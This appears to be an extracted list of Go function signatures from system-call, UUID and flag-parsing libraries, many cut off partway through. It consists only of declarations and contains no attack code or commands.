"func IoctlKCMUnattach(fd int, info KCMUnattach) error {"
"func IoctlLifreq(fd int, req uint, l "
"func IoctlRetInt(fd int, req uint) (int, error) {"
"func IoctlSetIfreqMTU(fd int, ifreq "
"func IoctlSetInt(fd int, req uint, value int) error {"
"func IoctlSetIntRetInt(fd int, req uint, arg int) (int, error) {"
"func IoctlSetPointerInt(fd int, req uint, value int) error {"
"func IoctlSetRTCTime(fd int, value "
"func IoctlSetRTCWkAlrm(fd int, value "
"func IoctlSetString(fd int, req uint, val string) error {"
"func IoctlSetStrioctlRetInt(fd int, req uint, s "
"func IoctlSetTermio(fd int, req uint, value "
"func IoctlSetTermios(fd int, req uint, value "
"func IoctlSetWinsize(fd int, req uint, value "
"func Ioperm(from int, num int, on int) (err error) {"
"func IsWow64Process(handle Handle, isWow64 "
"func IsWow64Process2(handle Handle, processMachine "
"func Kevent(kq int, changes, events []Kevent_t, timeout "
"func KexecFileLoad(kernelFd int, initrdFd int, cmdline string, flags int) error {"
"func KeyctlBuffer(cmd int, arg2 int, buf []byte, arg5 int) (ret int, err error) {"
"func KeyctlGetKeyringID(id int, create bool) (ringid int, err error) {"
"func KeyctlInstantiateIOV(id int, payload []Iovec, ringid int) error {"
"func KeyctlInt(cmd int, arg2 int, arg3 int, arg4 int, arg5 int) (ret int, err error) {"
"func KeyctlJoinSessionKeyring(name string) (ringid int, err error) {"
"func KeyctlRestrictKeyring(ringid int, keyType string, restriction string) error {"
"func KeyctlSearch(ringid int, keyType, description string, destRingid int) (id int, err error) {"
"func KeyctlSetperm(id int, perm uint32) error {"
"func KeyctlString(cmd int, id int) (string, error) {"
"func Kill(pid int, sig Signal) (err error) {"
"func Kill(pid int, sig syscall.Signal) (err error) {"
"func Kill(pid int, signum syscall.Signal) (err error) { return kill(pid, int(signum), 1) }"
"func Kill(pid int, signum syscall.Signal) (err error) {"
"func Klogctl(typ int, buf []byte) (n int, err error) {"
"func Klogset(typ int, arg int) (err error) {"
"func Kqueue() (fd int, err error) {"
"func Lchown(path string, uid int, gid int) (err error) { return syscall.EWINDOWS }"
"func Lchown(path string, uid int, gid int) (err error) {"
"func Lgetxattr(link string, attr string, dest []byte) (sz int, err error) {"
"func Lgetxattr(path string, attr string, dest []byte) (sz int, err error) {"
"func Link(oldpath string, newpath string) (err error) {"
"func Link(oldpath, newpath string) (err error) { return syscall.EWINDOWS }"
"func Link(path string, link string) (err error) {"
"func Linkat(olddirfd int, oldpath string, newdirfd int, newpath string, flags int) (err error) {"
"func Linkat(pathfd int, path string, linkfd int, link string, flags int) (err error) {"
"func Listen(s Handle, n int) (err error) {"
"func Listen(s int, backlog int) (err error) {"
"func Listen(s int, n int) (err error) {"
"func Listen(s int, n int) error {"
"func Listxattr(file string, dest []byte) (sz int, err error) {"
"func Listxattr(path string, dest []byte) (sz int, err error) {"
"func Llistxattr(link string, dest []byte) (sz int, err error) {"
"func Llistxattr(path string, dest []byte) (sz int, err error) {"
"func LoadLibrary(libname string) (handle Handle, err error) {"
"func LoadLibraryEx(libname string, zero Handle, flags uintptr) (handle Handle, err error) {"
"func LoadResource(module Handle, resInfo Handle) (resData Handle, err error) {"
"func LoadResourceData(module, resInfo Handle) (data []byte, err error) {"
"func LocalAlloc(flags uint32, length uint32) (ptr uintptr, err error) {"
"func LocalFree(hmem Handle) (handle Handle, err error) {"
"func LockFileEx(file Handle, flags uint32, reserved uint32, bytesLow uint32, bytesHigh uint32, overlapped "
"func LockResource(resData Handle) (addr uintptr, err error) {"
"func LookupSID(system, account string) (sid "
"func Lremovexattr(link string, attr string) (err error) {"
"func Lremovexattr(path string, attr string) (err error) {"
"func Lsetxattr(link string, attr string, data []byte, flags int) (err error) {"
"func Lsetxattr(path string, attr string, data []byte, flags int) (err error) {"
"func Lstat(path string, s "
"func Lstat(path string, st "
"func Lstat(path string, stat "
"func Lutimes(path string, tv []Timeval) error {"
"func Madvise(b []byte, advice int) (err error) {"
"func Madvise(b []byte, behav int) (err error) {"
"func MakeItimerval(interval, value time.Duration) Itimerval {"
"func MapViewOfFile(handle Handle, access uint32, offsetHigh uint32, offsetLow uint32, length uintptr) (addr uintptr, err error) {"
"func MemfdCreate(name string, flags int) (fd int, err error) {"
"func MemfdSecret(flags int) (fd int, err error) {"
"func MessageBox(hwnd HWND, text "
"func Mkdev(major, minor uint32) uint64 {"
"func Mkdir(dirfd int, path string, mode uint32) (err error) {"
"func Mkdir(path string, mode uint32) (err error) {"
"func Mkdirat(dirfd int, path string, mode uint32) (err error) {"
"func Mkfifo(path string, mode uint32) (err error) {"
"func Mkfifo(path string, mode uint32) error {"
"func Mkfifoat(dirfd int, path string, mode uint32) (err error) {"
"func Mkfifoat(dirfd int, path string, mode uint32) error {"
"func Mknod(path string, mode uint32, dev int) (err error) {"
"func Mknod(path string, mode uint32, dev uint64) (err error) {"
"func Mknodat(dirfd int, path string, mode uint32, dev int) (err error) {"
"func Mknodat(fd int, path string, mode uint32, dev int) (err error) {"
"func Mknodat(fd int, path string, mode uint32, dev uint64) (err error) {"
"func Mlock2(b []byte, flags int) (err error) {"
"func Mmap(fd int, offset int64, length int, prot int, flags int) (data []byte, err error) {"
"func Module32First(snapshot Handle, moduleEntry "
"func Module32Next(snapshot Handle, moduleEntry "
"func Mount(fd int, afd int, old string, flag int, aname string) (err error) {"
"func Mount(fsType string, dir string, flags int, data unsafe.Pointer) (err error) {"
"func Mount(source string, target string, fstype string, flags uintptr, data string) (err error) {"
"func MountSetattr(dirfd int, pathname string, flags uint, attr "
"func MoveMount(fromDirfd int, fromPathName string, toDirfd int, toPathName string, flags int) (err error) {"
"func Mprotect(b []byte, prot int) (err error) {"
"func Msync(b []byte, flags int) (err error) {"
"func MultiByteToWideChar(codePage uint32, dwFlags uint32, str "
"func Must(uuid UUID, err error) UUID {"
"func MustConstraints(c Constraints, err error) Constraints {"
"func NameToHandleAt(dirfd int, path string, flags int) (handle FileHandle, mountID int, err error) {"
"func NewConstraint(v string) (Constraints, error) {"
"func NewDCEGroup() (UUID, error) {"
"func NewDCEPerson() (UUID, error) {"
"func NewDCESecurity(domain Domain, id uint32) (UUID, error) {"
"func NewFileHandle(handleType int32, handle []byte) FileHandle {"
"func NewFlagSet(name string, errorHandling ErrorHandling) "
"func NewGTFOBinsExploit(binaryName string, inputs []string, args []string, envs []string, tmpFileContent string) "
"func NewHash(h hash.Hash, space UUID, data []byte, version int) UUID {"
"func NewMD5(space UUID, data []byte) UUID {"
"func NewRandom() (UUID, error) {"
"func NewRandomFromReader(r io.Reader) (UUID, error) {"
"func NewSHA1(space UUID, data []byte) UUID {"
"func NewTerminal(c io.ReadWriter, prompt string) "
"func NewUUID() (UUID, error) {"
"func NotifyServiceStatusChange(service Handle, notifyMask uint32, notifier "
"func NtQueryInformationProcess(proc Handle, procInfoClass int32, procInfo unsafe.Pointer, procInfoLen uint32, retLen "
"func NtQuerySystemInformation(sysInfoClass int32, sysInfo unsafe.Pointer, sysInfoLen uint32, retLen "
"func NtSetInformationFile(handle Handle, iosb "
"func NtSetInformationProcess(proc Handle, procInfoClass int32, procInfo unsafe.Pointer, procInfoLen uint32) (ntstatus error) {"
"func NtSetSystemInformation(sysInfoClass int32, sysInfo unsafe.Pointer, sysInfoLen uint32) (ntstatus error) {"
"func Open() (pty, tty "
"func Open(path string, mode int) (fd int, err error) {"
"func Open(path string, mode int, perm uint32) (fd Handle, err error) {"
"func Open(path string, mode int, perm uint32) (fd int, err error) {"
"func OpenByHandleAt(mountFD int, handle FileHandle, flags int) (fd int, err error) {"
"func OpenCurrentProcessToken() (Token, error) {"
"func OpenEvent(desiredAccess uint32, inheritHandle bool, name "
"func OpenMutex(desiredAccess uint32, inheritHandle bool, name "
"func OpenProcess(desiredAccess uint32, inheritHandle bool, processId uint32) (handle Handle, err error) {"
"func OpenProcessToken(process Handle, access uint32, token "
"func OpenService(mgr Handle, serviceName "
"func OpenThread(desiredAccess uint32, inheritHandle bool, threadId uint32) (handle Handle, err error) {"
"func OpenThreadToken(thread Handle, access uint32, openAsSelf bool, token "
"func OpenTree(dfd int, fileName string, flags uint) (r int, err error) {"
"func Openat(dirfd int, path string, flags int, mode uint32) (fd int, err error) {"
"func Openat(dirfd int, path string, mode int, perm uint32) (fd int, err error) {"
"func Openat(fdat int, path string, mode int, perm uint32) (fd int, err error) {"
"func Openat2(dirfd int, path string, how "
"func Opendir(name string) (uintptr, error) {"
"func Parse(input string) (string, error) {"
"func Parse(s string) (UUID, error) {"
"func ParseBytes(b []byte) (UUID, error) {"
"func ParseDirent(buf []byte, max int, names []string) (consumed int, count int, newnames []string) {"
"func ParseSocketControlMessage(b []byte) ([]SocketControlMessage, error) {"
"func Pathconf(path string, name int) (val int, err error) {"
"func PidfdGetfd(pidfd int, targetfd int, flags int) (fd int, err error) {"
"func PidfdOpen(pid int, flags int) (fd int, err error) {"
"func PidfdSendSignal(pidfd int, sig Signal, info "
"func Pipe2(p []int, flags int) (err error) {"
"func Pipe2(p []int, flags int) error {"
"func PivotRoot(newroot string, putold string) (err error) {"
"func Pledge(promises, execpromises string) error {"
"func Poll(fds []PollFd, timeout int) (n int, err error) {"
"func PostQueuedCompletionStatus(cphandle Handle, qty uint32, key uintptr, overlapped "
"func Ppoll(fds []PollFd, timeout "
"func Prctl(option int, arg2 uintptr, arg3 uintptr, arg4 uintptr, arg5 uintptr) (err error) {"
"func PrctlRetInt(option int, arg2 uintptr, arg3 uintptr, arg4 uintptr, arg5 uintptr) (int, error) {"
"func Pread(fd int, p []byte, offset int64) (n int, err error) {"
"func Preadv(fd int, iovs [][]byte, off int64) (n int, err error) {"
"func Preadv(fd int, iovs [][]byte, offset int64) (n int, err error) {"
"func Preadv2(fd int, iovs [][]byte, offset int64, flags int) (n int, err error) {"
"func Printf(input string, a ...interface{}) error {"
"func Prlimit(pid int, resource int, newlimit "
"func Process32First(snapshot Handle, procEntry "
"func Process32Next(snapshot Handle, procEntry "
"func ProcessIdToSessionId(pid uint32, sessionid "
"func ProcessVMReadv(pid int, localIov []Iovec, remoteIov []RemoteIovec, flags uint) (n int, err error) {"
"func ProcessVMWritev(pid int, localIov []Iovec, remoteIov []RemoteIovec, flags uint) (n int, err error) {"
"func Pselect(nfd int, r "
"func PtraceAttach(pid int) (err error) { return ptrace(PTRACE_ATTACH, pid, 0, 0) }"
"func PtraceAttach(pid int) (err error) { return ptrace(PT_ATTACH, pid, 0, 0) }"
"func PtraceCont(pid int, signal int) (err error) {"
"func PtraceDetach(pid int) (err error) { return ptrace(PTRACE_DETACH, pid, 0, 0) }"
"func PtraceDetach(pid int) (err error) { return ptrace(PT_DETACH, pid, 0, 0) }"
"func PtraceGetEventMsg(pid int) (msg uint, err error) {"
"func PtraceGetFpRegs(pid int, fpregsout "
"func PtraceGetFsBase(pid int, fsbase "
"func PtraceGetRegSetArm64(pid, addr int, regsout "
"func PtraceGetRegs(pid int, regsout "
"func PtraceGetRegs386(pid int, regsout "
"func PtraceGetRegsAmd64(pid int, regsout "
"func PtraceGetRegsArm(pid int, regsout "
"func PtraceGetRegsArm64(pid int, regsout "
"func PtraceGetRegsMips(pid int, regsout "
"func PtraceGetRegsMips64(pid int, regsout "
"func PtraceGetRegsMips64le(pid int, regsout "
"func PtraceGetRegsMipsle(pid int, regsout "
"func PtraceIO(req int, pid int, addr uintptr, out []byte, countin int) (count int, err error) {"
"func PtraceInterrupt(pid int) (err error) { return ptrace(PTRACE_INTERRUPT, pid, 0, 0) }"
"func PtraceLwpEvents(pid int, enable int) (err error) {"
"func PtraceLwpInfo(pid int, info uintptr) (err error) {"
"func PtracePeekData(pid int, addr uintptr, out []byte) (count int, err error) {"
"func PtracePeekText(pid int, addr uintptr, out []byte) (count int, err error) {"
"func PtracePeekUser(pid int, addr uintptr, out []byte) (count int, err error) {"
"func PtracePokeData(pid int, addr uintptr, data []byte) (count int, err error) {"
"func PtracePokeText(pid int, addr uintptr, data []byte) (count int, err error) {"
"func PtracePokeUser(pid int, addr uintptr, data []byte) (count int, err error) {"
"func PtraceSeize(pid int) (err error) { return ptrace(PTRACE_SEIZE, pid, 0, 0) }"
"func PtraceSetOptions(pid int, options int) (err error) {"
"func PtraceSetRegSetArm64(pid, addr int, regs "
"func PtraceSetRegs(pid int, regs "
"func PtraceSetRegs386(pid int, regs "
"func PtraceSetRegsAmd64(pid int, regs "
"func PtraceSetRegsArm(pid int, regs "
"func PtraceSetRegsArm64(pid int, regs "
"func PtraceSetRegsMips(pid int, regs "
"func PtraceSetRegsMips64(pid int, regs "
"func PtraceSetRegsMips64le(pid int, regs "
"func PtraceSetRegsMipsle(pid int, regs "
"func PtraceSingleStep(pid int) (err error) { return ptrace(PTRACE_SINGLESTEP, pid, 0, 0) }"
"func PtraceSyscall(pid int, signal int) (err error) {"
"func Ptsname(fd int) (name string, err error) {"
"func Putmsg(fd int, cl []byte, data []byte, flags int) (err error) {"
"func Pwrite(fd int, p []byte, offset int64) (n int, err error) {"
"func Pwritev(fd int, iovs [][]byte, off int64) (n int, err error) {"
"func Pwritev(fd int, iovs [][]byte, offset int64) (n int, err error) {"
"func Pwritev2(fd int, iovs [][]byte, offset int64, flags int) (n int, err error) {"
"func QueryFullProcessImageName(proc Handle, flags uint32, exeName "
"func QueryInformationJobObject(job Handle, JobObjectInformationClass int32, JobObjectInformation uintptr, JobObjectInformationLength uint32, retlen "
"func QueryServiceConfig(service Handle, serviceConfig "
"func QueryServiceConfig2(service Handle, infoLevel uint32, buff "
"func QueryServiceDynamicInformation(service Handle, infoLevel uint32, dynamicInfo unsafe.Pointer) (err error) {"
"func QueryServiceLockStatus(mgr Handle, lockStatus "
"func QueryServiceStatus(service Handle, status "
"func QueryServiceStatusEx(service Handle, infoLevel uint32, buff "
"func RangeArgs(min int, max int) PositionalArgs {"
"func RawSyscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err syscall.Errno) {"
"func RawSyscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func RawSyscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)"
"func RawSyscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno) {"
"func RawSyscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func RawSyscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2, err uintptr)"
"func RawSyscallNoError(trap, a1, a2, a3 uintptr) (r1, r2 uintptr) {"
"func RawSyscallNoError(trap, a1, a2, a3 uintptr) (r1, r2 uintptr)"
"func Read(fd Handle, p []byte) (n int, err error) {"
"func Read(fd int, p []byte) (n int, err error) {"
"func ReadConsole(console Handle, buf "
"func ReadDirectoryChanges(handle Handle, buf "
"func ReadDirent(fd int, buf []byte) (n int, err error) {"
"func ReadFile(fd Handle, p []byte, done "
"func ReadPassword(fd int) ([]byte, error) {"
"func ReadProcessMemory(process Handle, baseAddress uintptr, buffer "
"func Readlink(path string, buf []byte) (n int, err error) {"
"func Readlinkat(dirfd int, path string, buf []byte) (n int, err error) {"
"func Readv(fd int, iovs [][]byte) (n int, err error) {"
"func Recvfrom(fd Handle, p []byte, flags int) (n int, from Sockaddr, err error) {"
"func Recvfrom(fd int, p []byte, flags int) (n int, from Sockaddr, err error) {"
"func Recvmsg(fd int, p, oob []byte, flags int) (n, oobn int, recvflags int, from Sockaddr, err error) {"
"func RegEnumKeyEx(key Handle, index uint32, name "
"func RegNotifyChangeKeyValue(key Handle, watchSubtree bool, notifyFilter uint32, event Handle, asynchronous bool) (regerrno error) {"
"func RegOpenKeyEx(key Handle, subkey "
"func RegQueryInfoKey(key Handle, class "
"func RegQueryValueEx(key Handle, name "
"func Removexattr(file string, attr string) (err error) {"
"func Removexattr(path string, attr string) (err error) {"
"func Rename(from string, to string) (err error) {"
"func Rename(oldpath string, newpath string) (err error) {"
"func Rename(oldpath, newpath string) (err error) {"
"func Renameat(fromfd int, from string, tofd int, to string) (err error) {"
"func Renameat(olddirfd int, oldpath string, newdirfd int, newpath string) (err error) {"
"func Renameat2(olddirfd int, oldpath string, newdirfd int, newpath string, flags uint) (err error) {"
"func ReportEvent(log Handle, etype uint16, category uint16, eventId uint32, usrSId uintptr, numStrings uint16, dataSize uint32, strings "
"func RequestKey(keyType string, description string, callback string, destRingid int) (id int, err error) {"
"func Restore(fd int, oldState "
"func ResumeThread(thread Handle) (ret uint32, err error) {"
"func RtlGetNtVersionNumbers() (majorVersion, minorVersion, buildNumber uint32) {"
"func SchedGetaffinity(pid int, set "
"func SchedSetaffinity(pid int, set "
"func Seek(fd Handle, offset int64, whence int) (newoffset int64, err error) {"
"func Seek(fd int, offset int64, whence int) (newoffset int64, err error) {"
"func Seek(fd int, offset int64, whence int) (off int64, err error) {"
"func Seekdir(dir uintptr, pos int) {"
"func Select(nfd int, r "
"func Select(nmsgsfds int, r "
"func Send(s int, buf []byte, flags int) (err error) {"
"func Sendfile(outfd int, infd int, offset "
"func Sendmsg(fd int, p, oob []byte, to Sockaddr, flags int) (err error) {"
"func SendmsgN(fd int, p, oob []byte, to Sockaddr, flags int) (n int, err error) {"
"func Sendto(fd Handle, p []byte, flags int, to Sockaddr) (err error) {"
"func Sendto(fd int, p []byte, flags int, to Sockaddr) (err error) {"
"func Set(name, value string) error {"
"func SetCommTimeouts(handle Handle, timeouts "
"func SetConsoleCursorPosition(console Handle, position Coord) error {"
"func SetConsoleMode(console Handle, mode uint32) (err error) {"
"func SetFileCompletionNotificationModes(handle Handle, flags uint8) (err error) {"
"func SetFileInformationByHandle(handle Handle, class uint32, inBuffer "
"func SetFilePointer(handle Handle, lowoffset int32, highoffsetptr "
"func SetFileTime(handle Handle, ctime "
"func SetHandleInformation(handle Handle, mask uint32, flags uint32) (err error) {"
"func SetInformationJobObject(job Handle, JobObjectInformationClass uint32, JobObjectInformation uintptr, JobObjectInformationLength uint32) (ret int, err error) {"
"func SetKernelObjectSecurity(handle Handle, securityInformation SECURITY_INFORMATION, securityDescriptor "
"func SetNamedPipeHandleState(pipe Handle, state "
"func SetNamedSecurityInfo(objectName string, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"func SetNonblock(fd int, nonblocking bool) (err error) {"
"func SetPriorityClass(process Handle, priorityClass uint32) (err error) {"
"func SetProcessPriorityBoost(process Handle, disable bool) (err error) {"
"func SetProcessShutdownParameters(level uint32, flags uint32) (err error) {"
"func SetProcessWorkingSetSizeEx(hProcess Handle, dwMinimumWorkingSetSize uintptr, dwMaximumWorkingSetSize uintptr, flags uint32) (err error) {"
"func SetSecurityInfo(handle Handle, objectType SE_OBJECT_TYPE, securityInformation SECURITY_INFORMATION, owner "
"func SetServiceStatus(service Handle, serviceStatus "
"func SetStdHandle(stdhandle uint32, handle Handle) (err error) {"
"func SetTokenInformation(token Token, infoClass uint32, info "
"func Setenv(key, value string) error {"
"func SetfsgidRetGid(gid int) (int, error) {"
"func SetfsuidRetUid(uid int) (int, error) {"
"func Setitimer(which ItimerWhich, it Itimerval) (Itimerval, error) {"
"func Setns(fd int, nstype int) (err error) {"
"func Setpgid(pid int, pgid int) (err error) {"
"func Setpriority(which int, who int, prio int) (err error) {"
"func Setregid(rgid int, egid int) (err error) {"
"func Setresgid(rgid int, egid int, sgid int) (err error) {"
"func Setresuid(ruid int, euid int, suid int) (err error) {"
"func Setreuid(ruid int, euid int) (err error) {"
"func Setrlimit(resource int, lim "
"func Setrlimit(resource int, rlim "
"func Setrlimit(which int, lim "
"func Setsid() (pid int, err error) {"
"func Setsockopt(s Handle, level int32, optname int32, optval "
"func SetsockoptByte(fd, level, opt int, value byte) (err error) {"
"func SetsockoptCanRawFilter(fd, level, opt int, filter []CanFilter) error {"
"func SetsockoptICMPv6Filter(fd, level, opt int, filter "
"func SetsockoptIPMreq(fd Handle, level, opt int, mreq "
"func SetsockoptIPMreq(fd, level, opt int, mreq "
"func SetsockoptIPMreqn(fd, level, opt int, mreq "
"func SetsockoptIPv6Mreq(fd Handle, level, opt int, mreq "
"func SetsockoptIPv6Mreq(fd, level, opt int, mreq "
"func SetsockoptInet4Addr(fd Handle, level, opt int, value [4]byte) (err error) {"
"func SetsockoptInet4Addr(fd, level, opt int, value [4]byte) (err error) {"
"func SetsockoptInt(fd Handle, level, opt int, value int) (err error) {"
"func SetsockoptInt(fd, level, opt int, value int) (err error) {"
"func SetsockoptLinger(fd Handle, level, opt int, l "
"func SetsockoptLinger(fd, level, opt int, l "
"func SetsockoptPacketMreq(fd, level, opt int, mreq "
"func SetsockoptSockFprog(fd, level, opt int, fprog "
"func SetsockoptString(fd, level, opt int, s string) (err error) {"
"func SetsockoptTCPRepairOpt(fd, level, opt int, o []TCPRepairOpt) (err error) {"
"func SetsockoptTimeval(fd Handle, level, opt int, tv "
"func SetsockoptTimeval(fd, level, opt int, tv "
"func SetsockoptTpacketReq(fd, level, opt int, tp "
"func SetsockoptTpacketReq3(fd, level, opt int, tp "
"func SetsockoptUint64(fd, level, opt int, value uint64) (err error) {"
"func SetupDiBuildDriverInfoList(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiCallClassInstaller(installFunction DI_FUNCTION, deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiClassGuidsFromNameEx(className string, machineName string) ([]GUID, error) {"
"func SetupDiCreateDeviceInfo(deviceInfoSet DevInfo, deviceName string, classGUID "
"func SetupDiDestroyDriverInfoList(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiEnumDeviceInfo(deviceInfoSet DevInfo, memberIndex int) ("
"func SetupDiEnumDriverInfo(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetClassInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetDeviceInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetDeviceInstanceId(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetDeviceProperty(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetDeviceRegistryProperty(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetDriverInfoDetail(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiGetSelectedDriver(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiOpenDevRegKey(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiSetClassInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiSetDeviceInstallParams(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiSetDeviceRegistryProperty(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiSetSelectedDevice(deviceInfoSet DevInfo, deviceInfoData "
"func SetupDiSetSelectedDriver(deviceInfoSet DevInfo, deviceInfoData "
"func SetupUninstallOEMInf(infFileName string, flags SUOI) error {"
"func Setxattr(file string, attr string, data []byte, flags int) (err error) {"
"func Setxattr(path string, attr string, data []byte, flags int) (err error) {"
"func ShellExecute(hwnd Handle, verb "
"func Shutdown(fd Handle, how int) (err error) {"
"func Shutdown(fd int, how int) (err error) {"
"func Shutdown(s int, how int) (err error) {"
"func Shutdown(s, how int) (err error) {"
"func Shutdown(s, how int) error {"
"func Signalfd(fd int, sigmask "
"func SizeofResource(module Handle, resInfo Handle) (size uint32, err error) {"
"func SleepEx(milliseconds uint32, alertable bool) (ret uint32) {"
"func Socket(domain, typ, proto int) (fd Handle, err error) {"
"func Socket(domain, typ, proto int) (fd int, err error) {"
"func Socketpair(domain, typ, proto int) (fd [2]int, err error) {"
"func Splice(rfd int, roff "
"func Sprintf(input string, a ...interface{}) string {"
"func StartService(service Handle, numArgs uint32, argVectors "
"func Stat(path string, edir []byte) (n int, err error) {"
"func Stat(path string, s "
"func Stat(path string, st "
"func Stat(path string, sta "
"func Stat(path string, stat "
"func Stat(path string, statptr "
"func Statfs(path string, buf "
"func Statfs(path string, st "
"func Statfs(path string, stat "
"func Statvfs(path string, buf "
"func Statvfs(path string, vfsstat "
"func Statvfs1(path string, buf "
"func Statx(dirfd int, path string, flags int, mask int, stat "
"func String(name string, value string, usage string) "
"func StringArray(name string, value []string, usage string) "
"func StringArrayP(name, shorthand string, value []string, usage string) "
"func StringP(name, shorthand string, value string, usage string) "
"func StringSlice(name string, value []string, usage string) "
"func StringSliceP(name, shorthand string, value []string, usage string) "
"func StringToInt(name string, value map[string]int, usage string) "
"func StringToInt64(name string, value map[string]int64, usage string) "
"func StringToInt64P(name, shorthand string, value map[string]int64, usage string) "
"func StringToIntP(name, shorthand string, value map[string]int, usage string) "
"func StringToString(name string, value map[string]string, usage string) "
"func StringToStringP(name, shorthand string, value map[string]string, usage string) "
"func SubscribeServiceChangeNotifications(service Handle, eventType uint32, callback uintptr, callbackCtx uintptr, subscription "
"func Symlink(oldpath string, newpath string) (err error) {"
"func Symlink(path string, link string) (err error) {"
"func Symlink(path, link string) (err error)    { return syscall.EWINDOWS }"
"func Symlinkat(oldpath string, newdirfd int, newpath string) (err error) {"
"func SyncFileRange(fd int, off int64, n int64, flags int) (err error) {"
"func SyncFileRange(fd int, off int64, n int64, flags int) error {"
"func Syscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err syscall.Errno) {"
"func Syscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func Syscall(trap, a1, a2, a3 uintptr) (r1, r2 uintptr, err syscall.ErrorString)"
"func Syscall(trap, a1, a2, a3 uintptr) (r1, r2, err uintptr)"
"func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno) {"
"func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2 uintptr, err syscall.ErrorString)"
"func Syscall6(trap, a1, a2, a3, a4, a5, a6 uintptr) (r1, r2, err uintptr)"
"func Syscall9(num, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err syscall.Errno) // sic"
"func Syscall9(num, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func Syscall9(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err syscall.Errno) {"
"func Syscall9(trap, a1, a2, a3, a4, a5, a6, a7, a8, a9 uintptr) (r1, r2 uintptr, err syscall.Errno)"
"func SyscallNoError(trap, a1, a2, a3 uintptr) (r1, r2 uintptr) {"
"func SyscallNoError(trap, a1, a2, a3 uintptr) (r1, r2 uintptr)"
"func Sysconf(which int) (n int64, err error) {"
"func Sysctl(name string) (string, error) {"
"func SysctlArgs(name string, args ...int) (string, error) {"
"func SysctlKinfoProc(name string, args ...int) ("
"func SysctlKinfoProcSlice(name string, args ...int) ([]KinfoProc, error) {"
"func SysctlRaw(name string, args ...int) ([]byte, error) {"
"func SysctlUint32(name string) (uint32, error) {"
"func SysctlUint32Args(name string, args ...int) (uint32, error) {"
"func SysctlUint64(name string, args ...int) (uint64, error) {"
"func SysvShmAttach(id int, addr uintptr, flag int) ([]byte, error) {"
"func SysvShmCtl(id, cmd int, desc "
"func SysvShmGet(key, size, flag int) (id int, err error) {"
"func Tcgetattr(fildes int, termptr "
"func Tcsetattr(fildes int, when int, termptr "
"func Tee(rfd int, wfd int, len int, flags int) (n int64, err error) {"
"func Telldir(dir uintptr) (int, error) {"
"func TerminateJobObject(job Handle, exitCode uint32) (err error) {"
"func TerminateProcess(handle Handle, exitcode uint32) (err error) {"
"func Tgkill(tgid int, tid int, sig syscall.Signal) (err error) {"
"func Thread32First(snapshot Handle, threadEntry "
"func Thread32Next(snapshot Handle, threadEntry "
"func TimeToTimespec(t time.Time) (Timespec, error) {"
"func TimerfdCreate(clockid int, flags int) (fd int, err error) {"
"func TimerfdGettime(fd int, currValue "
"func TimerfdSettime(fd int, flags int, newValue "
"func TranslateAccountName(username string, from, to uint32, initSize int) (string, error) {"
"func TransmitFile(s Handle, handle Handle, bytesToWrite uint32, bytsPerSend uint32, overlapped "
"func Truncate(path string, length int64) (err error) {"
"func UTF16FromString(s string) ([]uint16, error) {"
"func Uint(name string, value uint, usage string) "
"func Uint16(name string, value uint16, usage string) "
"func Uint16P(name, shorthand string, value uint16, usage string) "
"func Uint32(name string, value uint32, usage string) "
"func Uint32P(name, shorthand string, value uint32, usage string) "
"func Uint64(name string, value uint64, usage string) "
"func Uint64P(name, shorthand string, value uint64, usage string) "
"func Uint8(name string, value uint8, usage string) "
"func Uint8P(name, shorthand string, value uint8, usage string) "
"func UintP(name, shorthand string, value uint, usage string) "
"func UintSlice(name string, value []uint, usage string) "
"func UintSliceP(name, shorthand string, value []uint, usage string) "
"func Unlinkat(dirfd int, path string, flags int) (err error) {"
"func UnlockFileEx(file Handle, reserved uint32, bytesLow uint32, bytesHigh uint32, overlapped "
"func Unmount(name string, mtm int) (err error) {"
"func Unmount(name, old string) (err error) {"
"func Unmount(path string, flags int) (err error) {"
"func Unmount(target string, flags int) (err error) {"
"func Unveil(path string, flags string) error {"
"func Ustat(dev int, ubuf "
"func Utime(path string, buf "
"func Utime(path string, utim "
"func Utimes(path string, tv []Timeval) (err error) {"
"func Utimes(path string, tv []Timeval) error {"
"func UtimesNano(path string, ts []Timespec) (err error) {"
"func UtimesNano(path string, ts []Timespec) error {"
"func UtimesNanoAt(dirfd int, path string, ts []Timespec, flags int) error {"
"func Var(value Value, name string, usage string) {"
"func VarP(value Value, name, shorthand, usage string) {"
"func VerQueryValue(block unsafe.Pointer, subBlock string, pointerToBufferPointer unsafe.Pointer, bufSize "
"func VirtualAlloc(address uintptr, size uintptr, alloctype uint32, protect uint32) (value uintptr, err error) {"
